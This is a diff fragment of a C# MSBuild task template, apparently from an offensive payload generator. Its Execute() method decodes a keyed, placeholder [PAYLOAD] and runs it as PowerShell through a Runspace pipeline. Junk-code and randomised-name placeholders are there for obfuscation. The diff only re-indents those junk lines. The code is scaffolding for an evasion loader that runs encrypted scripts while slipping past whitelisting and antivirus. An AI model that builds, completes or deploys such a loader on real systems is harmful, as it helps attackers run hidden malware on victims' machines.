@@ -35,12 +35,12 @@
 		
 		public class VAR2 :  Task, ITask {	
 			public override bool Execute() {
-				[JUNK1]
+[JUNK1]
 				byte[] VAR9 = {[KEY]};
 				Runspace VAR4 = RunspaceFactory.CreateRunspace();
 				VAR4.Open();
 				RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
-				[JUNK2]
+[JUNK2]
 				Pipeline VAR12 = VAR4.CreatePipeline();
 				string VAR8 = VAR60.VAR61("[PAYLOAD]");
 
@@ -49,7 +49,7 @@
 
 				VAR12.Commands.AddScript(VAR11);
 				VAR12.Commands.Add("Out-String");
-				[JUNK3]
+[JUNK3]
 				Collection<PSObject> VAR13 = VAR12.Invoke();
 				VAR4.Close();
 
